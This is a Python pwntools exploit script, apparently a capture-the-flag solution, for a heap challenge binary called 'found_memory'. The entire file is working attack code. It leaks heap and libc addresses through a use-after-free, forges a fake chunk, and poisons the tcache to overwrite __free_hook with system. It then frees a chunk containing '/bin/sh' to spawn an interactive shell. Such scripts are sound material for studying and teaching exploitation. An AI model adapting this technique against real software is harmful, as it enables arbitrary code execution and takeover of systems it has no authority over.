#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or 'found_memory')
libc = ELF(exe.libc.path)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def malloc(): io.sendlineafter(b"> ", b"1")

def delete(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"free: ", str(idx).encode())

def write(idx, data):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"edit: ", str(idx).encode())
    io.sendlineafter(b"data: ", data)

def printf(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"view: ", str(idx).encode())
    return u64(io.recvline()[0:8])

gdbscript = '''
continue
'''.format(**locals())

io = start()

for i in range(21): malloc()
write(20, p64(0x21)*4)
delete(1)
delete(0)

leak = printf(0)
write(0, p64(leak-0x20) + p64(0x00)*2 + p64(0x501) + p64(0x00)*2)
malloc()
malloc()
delete(1)
libcBase = printf(1) - 0x1ecbe0
__free_hook = libcBase + libc.symbols['__free_hook']

for i in range(21):
    if i != 1: delete(i)

malloc()
malloc()
delete(1)
delete(0)
write(0, p64(__free_hook))
malloc()
malloc()
write(1, p64(libcBase + libc.symbols['system']))
write(0, p64(u64(b"/bin/sh\x00")))

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"free: ", b"0")

io.interactive()
